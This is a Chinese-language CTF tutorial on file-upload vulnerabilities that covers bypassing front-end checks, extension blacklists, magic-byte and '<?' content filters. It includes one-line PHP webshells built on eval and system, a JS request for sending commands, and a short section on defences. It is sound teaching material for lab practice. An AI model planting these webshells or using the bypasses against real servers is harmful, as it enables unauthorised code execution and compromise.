---
title: 文件上传基础：校验点、可执行后缀与常见坑
date: 2026-10-24 10:00:00
updated: 2026-10-28 20:30:00
categories:
  - CTF
  - Web
  - 文件上传
tags:
  - 文件上传
  - 后缀绕过
  - .htaccess
  - 文件头伪造
  - 一句话木马
  - PHP 短标签
  - 入门基础
description: 文件上传题的通用知识：漏洞从哪来、前端校验为什么不算防线、服务端会在哪些地方拦、哪些后缀可能被解析，外加 8 个新手常踩的坑和完整流程速查。
difficulty: 入门
topic: 文件上传
series: 文件上传
series_order: 0
permalink: 2026/10/24/web-knowledge-upload-basics/
---

{% note primary %}
**本主题速览**

- **难度**：入门
- **题目**：[ACTF2020 新生赛]Upload（[第一篇](/2026/10/24/web-ctf-upload-actf2020/)）、[极客大挑战 2019]Upload（[第二篇](/2026/10/24/web-ctf-upload-geek2019/)）
- **考点**：前端校验绕过、后缀黑名单、`Content-Type` / 文件头校验、内容黑名单、`.htaccess` 解析映射
- **第一篇关键**：黑名单漏了 `.phtml`，而服务器恰好把 `.phtml` 交给 PHP 解析
- **第二篇关键**：内容黑名单只拦 `<?`，改用 PHP 5 的 `<script language="php">` 标签就绕过了
- **一句话思路**：让请求里的 `filename` 保持可执行后缀，再访问它确认真的执行
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：HTTP 请求基础、HTML 表单、浏览器开发者工具（F12）
- **环境**：CTF 靶场。文中靶场地址是当时的临时环境，现在多半已失效，请换成自己的靶场或本地环境（如 upload-labs）。
- 本文所有测试仅用于**授权靶场和教学**，请勿对未授权的站点进行任何测试。
{% endnote %}

{% note default %}
**做题路线**

`看前端` → `绕前端` → `摸后端黑名单` → `判断能否解析` → `传马` → `定位路径` → `执行命令`
{% endnote %}

## 文件上传漏洞是怎么产生的

一句话：**上传点把用户上传的文件，当成了服务器可执行的代码。**

正常的图片上传，文件存进去之后只是被 `img` 标签读出来显示；但如果上传目录里的文件会被 PHP 之类的解释器执行，攻击者传一个脚本上去，再访问它，就拿到了代码执行权限（RCE）。

| 上传的文件 | 服务端怎么处理 | 结果 |
| --- | --- | --- |
| 一张图片 | 当静态文件读取、返回 | 正常 |
| 一个 `.php` 脚本 | 交给 PHP 解释器执行 | **RCE** |
| 一个 `.phtml` 脚本 | 取决于服务器配置 | 可能执行，也可能不执行 |

所以文件上传题的核心永远是同一个问题：

> **我能不能让服务端把一个“可执行后缀”的文件存下来，并且它真的会被解析？**

## 前端校验不是防线

很多上传点会在浏览器里用 JavaScript 检查后缀，比如本题的 `checkFile()`。它确实能挡住普通用户，但**这段代码运行在攻击者的浏览器里**。

| 校验位置 | 谁说了算 | 能挡住攻击者吗 |
| --- | --- | --- |
| 浏览器里的 JS | 攻击者自己 | ❌ 可以关掉、覆盖，或直接发包 |
| 服务端 | 服务端 | ✅ 这才是真防线 |

攻击者完全可以：

- 关掉 JS；
- 覆盖掉那个函数；
- 根本不用浏览器，直接发 HTTP 请求。

判断一个校验是不是“真防线”，标准只有一个：**绕过浏览器之后，服务端还拦不拦。**

## 服务端可能在哪些地方拦

| 检查点 | 典型做法 | 绕过思路 |
| --- | --- | --- |
| 后缀 | 黑名单 / 白名单 | 黑名单找遗漏（`phtml`、`pht`、`phar`、大小写等）；白名单要靠解析漏洞或配置 |
| Content-Type | 只允许 `image/*` | 请求头是客户端说了算，改成 `image/jpeg` 即可 |
| 文件内容 | `getimagesize()`、magic bytes | 在 payload 前面加 `GIF89a` 等文件头 |
| 文件名 | 随机重命名 | 一般绕不过，但要看它是否**保留后缀** |
| 执行权限 | 上传目录禁止执行脚本 | 这是最有效的防御，一旦做对，传什么都白搭 |

{% note warning %}
本题只做了**后缀黑名单**这一层，而且漏了 `phtml`。先记住这个结论，后面会一步步验证。
{% endnote %}

## 常见可执行后缀

```text
php  php3  php4  php5  php7  phtml  pht  phar  pgif  inc
```

其中 `phtml`、`pht` 能不能执行，**完全取决于 Web 服务器的配置**。记住这句话，后面会用到。

## PHP 的几种“开标签”

上传题的过滤，很多时候盯的就是“文件里有没有 `<?`”。所以要知道 PHP 还有哪些等价写法：

| 写法 | 说明 | PHP 7 |
| --- | --- | --- |
| `<?php ... ?>` | 标准标签，最常用 | ✅ |
| `<? ... ?>` | 短标签，需要 `short_open_tag` 打开 | 取决于配置 |
| `<?= ... ?>` | 短输出标签，等价于 `<?php echo ... ?>` | ✅ |
| `<script language="php"> ... </script>` | PHP 5 专用，7.0 起移除 | ❌ |

最后一种在 PHP 5 时代很常见，**它一个 `<?` 都不含**。碰上“只拦 `<?`”的内容黑名单，这就是现成的绕过写法，第二篇会用到。

## 我踩过的坑

这一章是真实过程，不是事后润色。每个坑都附上现象和正确做法，方便对照排查。

| # | 坑 | 一句话解法 |
| --- | --- | --- |
| 1 | 把木马改名成 `.jpg` 去骗前端 | 改请求里的 `filename`，不改文件 |
| 2 | 上传的文件内容根本不是木马 | 上传前打开看一眼 |
| 3 | `eval` 里塞系统命令 | 执行命令用 `system()` |
| 4 | 变量函数和 `system()` 混用 | 两种风格别混 |
| 5 | URL 里的特殊字符没编码 | 空格写 `%20`，或改用 POST |
| 6 | 把“上传成功”当成“木马可用” | 按四步逐层验证 |
| 7 | 后缀拼成 `phmtl`，上传“成功”但不解析 | 核对拼写，`phtml` 不是 `phmtl` |
| 8 | 页面只剩 `GIF89a`，判断不了执行没执行 | 带参数发一次请求验证 |

### 坑 1：把木马改名成 `.jpg` 去骗前端

{% label danger@现象 %} 本地把 `x.jpg` 传上去，提示 `Upload Success`，但访问 `upload/3e602dd0....jpg` 什么也不执行。

{% label warning@原因 %} 前端校验看的是浏览器里的文件名，但**服务端保存时用的是请求里的 `filename` 字段**。你把文件真名改成 `.jpg`，等于把 `filename` 也改成了 `x.jpg`，服务端老老实实存成图片后缀。而且这个文件名的 md5 一算就是回显里的名字：

```text
md5("x.jpg") = 3e602dd0ab83a3a8c3f32309bb9a88f9
```

{% label success@正确做法 %} 文件名保持 `.phtml`，用 1.3 的方法让前端 JS 不执行。**改的是请求，不是文件。**

### 坑 2：上传的文件内容根本不是木马

{% label danger@现象 %} 访问上传后的 `.phtml`，浏览器显示的是一个绿色的 "Upload Page" 页面，还带着 `Saved to: upload/xxx.jpg` 的字样。

{% label warning@原因 %} 那个 `.phtml` 文件的内容就是一整页 HTML——大概率是把某个上传练习页面“另存为”成了 `js_webshell.phtml`，然后选错文件上传了。服务端把 HTML 原样返回，浏览器就把它渲染出来了。

用哈希也能确认没传错文件：

```text
md5("js_webshell.phtml") = 919539e3b40ca50dc6764a318ad61c1f
```

{% label success@正确做法 %} 上传前一定在编辑器里打开看一眼内容。文件名叫 `webshell` 不代表它是 webshell。

### 坑 3：`eval` 执行的是 PHP，不是系统命令

{% label danger@现象 %} 木马是

```php
<script language=php>eval($_POST['shell']);</script>
```

传 `shell=ls -al`，页面白屏或报错。

{% label warning@原因 %} `eval()` 执行的是 **PHP 代码**，`ls -al` 不是 PHP 语法，直接 Parse error。

另外 `<script language=php>` 是 PHP 5 时代的老式标签，值的引号写法在部分版本里还会影响识别，PHP 7.0 已经彻底移除。靶机恰好是 PHP 5.6.40 才没在这里翻车。

{% label success@正确做法 %} 要执行命令就用 `system()`：

```php
<?php system($_POST['shell']); ?>
```

或者保持 `eval`，那传进去的必须是 PHP 代码：

```text
shell=system('ls -al');
```

### 坑 4：变量函数调用和 `system(...)` 混用

{% label danger@现象 %}

```text
Fatal error: Function name must be a string in
/var/www/html/uplo4d/919539e3b40ca50dc6764a318ad61c1f.phtml on line 1
```

请求是 `?shell=system('ls -al;')`。

{% label warning@原因 %} 木马写成了变量函数：

```php
<?php $_GET['shell'](); ?>
```

PHP 会把 `$_GET['shell']` 的**值**当成函数名，也就是说它试图调用一个名叫 `system('ls -al;')` 的函数。函数名里不能带括号和参数，于是报错。

{% label success@正确做法 %} 两种风格别混：

| 木马内容 | 传参方式 | 说明 |
| --- | --- | --- |
| `<?php system($_GET['shell']); ?>` | `?shell=ls -al` | 只传命令本身 |
| `<?php eval($_GET['shell']); ?>` | `?shell=system('ls -al');` | 传 PHP 代码 |
| `<?php $_GET['shell'](); ?>` | `?shell=system` | 只传函数名，参数得另外传 |

### 坑 5：URL 里的特殊字符没编码

{% label danger@现象 %} 带空格的命令（`ls -al`）传过去被截断或参数错乱。

{% label warning@原因 %} GET 参数在地址栏里传输，空格、`&`、`#`、`+` 都有自己的含义。

{% label success@正确做法 %} 空格写成 `%20`；或者干脆用 POST，在浏览器控制台里发：

```javascript
fetch('/uplo4d/xxx.phtml', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'shell=' + encodeURIComponent('ls -al /')
}).then(r => r.text()).then(console.log)
```

### 坑 6：把“上传成功”当成“木马可用”

{% label danger@现象 %} 提示 `Upload Success`，但访问没反应。

{% label warning@原因 %} 上传成功只说明**文件写进去了**，不代表后缀会被解析、也不代表文件内容是有效的 PHP。

{% label success@正确做法 %} 按这个顺序验证：

1. 文件内容是否正确（打开看一眼）；
2. 后缀是否会被解析（先传 `<?php echo "test123"; ?>` 试一下）；
3. 路径是否正确（md5 算一下，或看回显）；
4. 最后才上命令执行。

### 坑 7：后缀拼错，上传“成功”却永远不解析

{% label danger@现象 %} 传 `up.phmtl`，提示上传成功，访问后页面只有一个 `GIF89a`，命令怎么都执行不了。

{% label warning@原因 %} 黑名单拦的是 `php` 这类后缀，`phmtl` 不在名单里，所以顺利落盘；可服务器同样不认识 `phmtl`，不会交给 PHP 解析。**“不在黑名单里”和“会被解析”是两回事。**

{% label success@正确做法 %} 构造请求前核对一遍后缀拼写。拿不准就把可执行后缀挨个试一遍（`phtml`、`pht`、`php5`、`php7`……），先用 `echo` 版本确认能解析，再上真 payload。

### 坑 8：只看到 `GIF89a`，判断不了到底执行没执行

{% label danger@现象 %} 访问 `up.phtml`，页面除了文件头 `GIF89a` 什么都没有。

{% label warning@原因 %} 两种情况在页面上长得一模一样：一种是被当静态文件原样返回；另一种是 PHP 确实执行了，但 `eval` 没收到参数、什么也没输出，页面剩下的只有文件头文本。

{% label success@正确做法 %} 别靠“页面有没有变化”猜。直接带参数发一次请求（`a=system('id');`），有输出才算执行；没输出再看响应头里有没有 `X-Powered-By: PHP`。

## 完整流程速查表

| 步骤 | 目的 | 操作 |
| --- | --- | --- |
| 1 | 看前端拦什么 | 读 `js/main.js`，确认是白名单还是黑名单 |
| 2 | 绕过前端 | 禁用 JS / 覆盖函数 / 删 `onsubmit` / curl |
| 3 | 摸后端黑名单 | 同一内容换后缀逐个试，看返回 |
| 4 | 摸内容检查 | 回显 `not image` → 加 `GIF89a`；回显 `included '<?'` → 换 `<script language="php">` |
| 5 | 判断是否解析 | 访问可执行后缀，再带参数确认 |
| 6 | 找根因 | 读 `.htaccess` / `httpd.conf` |
| 7 | 传马 | `GIF89a` + 一句话 / `system()` |
| 8 | 定位文件 | 回显路径，或 `md5(原文件名).后缀` |
| 9 | 执行命令 | `?c=id`、`?c=cat /flag` |

{% note default %}
**打印版口诀**：看前端拦什么 → 绕过前端 → 摸黑名单 → 摸内容检查 → 判解析 → 传马 → 定位 → 执行。
{% endnote %}

## 新手常见问题

{% note info **Q1：页面只能点按钮，我怎么传 `.phtml`？** %}
前端校验只是浏览器里的 JS，禁用 JS 或用开发者工具改请求就行。见 1.3。
{% endnote %}

{% note info **Q2：`.phtml` 传上去了，为什么还是当文本显示？** %}
看响应头。如果 `Content-Type: image/gif`、没有 `X-Powered-By: PHP`，说明服务器没把它当 PHP 解析。多半是缺少 `.htaccess` 里的 Handler 映射。
{% endnote %}

{% note info **Q3：文件明明传成功了，访问却 404？** %}
先看回显路径。这类靶场常常把文件名改成 `md5(原文件名)`，路径和你想的不一样。
{% endnote %}

{% note info **Q4：用 `eval` 为什么不执行 `ls`？** %}
`eval` 执行 PHP 代码，不执行系统命令。用 `system()` / `exec()` / `shell_exec()`。
{% endnote %}

{% note info **Q5：报 `Function name must be a string`？** %}
变量函数调用 `$f()` 只认函数名，不能把 `system('...')` 整个塞进去。见坑 4。
{% endnote %}

{% note info **Q6：靶场地址打不开了？** %}
这类在线靶场地址是临时分配的，过期就失效。可以本地搭 upload-labs 练习，思路完全一样。
{% endnote %}

{% note info **Q7：提示 `NO! HACKER! your file included '<?'` 怎么办？** %}
内容里有 `<?`，被字符串黑名单拦了。换一个不含 `<?` 的等价写法，比如 PHP 5 的 `<script language="php">...</script>`。见 2.5。
{% endnote %}

{% note info **Q8：页面只回显 `GIF89a`，木马到底生效了吗？** %}
看页面判断不了：可能后缀根本不解析，也可能执行了但没传参。带参数请求一次才有结论。见坑 8。
{% endnote %}

## 顺手聊聊怎么防

| 优先级 | 措施 | 说明 |
| --- | --- | --- |
| ★★★ | **上传目录禁止执行脚本** | Nginx/Apache 里关闭上传目录的脚本解析，这一条最关键 |
| ★★★ | **用白名单，不用黑名单** | 只允许 `jpg/png/gif`，其他一律拒绝 |
| ★★☆ | **按内容重命名** | 不要用用户提交的文件名，随机化且不保留用户可控后缀 |
| ★★☆ | **校验真实文件类型** | `getimagesize()` / `finfo` 检查 magic bytes，而不是只看 `Content-Type` |
| ★☆☆ | **不要回显存储路径** | `Upload Success! Look here~ ./uplo4d/xxx` 这种提示等于把路铺好了 |
| ★☆☆ | **不要用字符串黑名单拦内容** | 拦 `<?` 只是自欺欺人：`<script language="php">`、短标签都能绕，黑名单永远列不全 |
| ★☆☆ | **限制大小和数量** | 避免被当成存储滥用 |

{% note success %}
如果只能做一件事，就做第一条：**让上传目录里的文件不能被解析。** 这一步做对，后面传什么都不成立。
{% endnote %}

## 总结

这两篇写下来，文件上传的完整链路基本都覆盖到了：

- **前端校验不是防线**，绕过它只是第一步；
- **“能上传”和“能解析”是两件事**，`.pht` 和 `.phtml` 的对比就是最好的例子；
- **每一层拦截都有它自己的绕过方式**：后缀黑名单靠漏网后缀，图片头检查靠 `GIF89a`，内容黑名单靠 `<?` 的等价写法；
- **黑名单天然有遗漏**，而 `.htaccess` 往往才是决定“为什么偏偏是这个后缀”的最后一环；
- **调试时先确认变量**：文件内容对不对、路径对不对、后缀解析不解析，逐层排除，比一上来就怀疑 payload 有效得多。

> 通用套路可以记成一句话：
>
> **看前端 → 绕后端 → 判解析 → 传马 → 定位路径 → 执行命令**

{% note info %}
这个主题还会继续补充更多题目。后续题目会按同样的结构单独成篇，方便放在一起对比不同靶场的过滤思路。
{% endnote %}
